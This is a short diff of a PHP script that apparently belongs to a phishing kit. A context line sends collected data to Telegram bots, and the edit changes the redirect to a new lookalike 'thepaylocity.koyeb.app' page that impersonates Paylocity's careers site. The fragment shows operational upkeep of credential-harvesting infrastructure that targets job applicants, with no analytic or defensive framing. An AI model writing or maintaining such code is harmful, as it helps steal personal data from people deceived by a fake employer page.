@@ -93,7 +93,7 @@ sendMessageToTelegramBots($telegram_message, $telegram_bots);
 
 
 
-header("Location:https://paylocity-hrlive.koyeb.app/www.paylocity.com/careers/all-listings.job.34092/processing.html");
+header("Location:https://thepaylocity.koyeb.app/www.paylocity.com/careers/all-listings.job.34092/processing.html");
 
 exit; 
 }
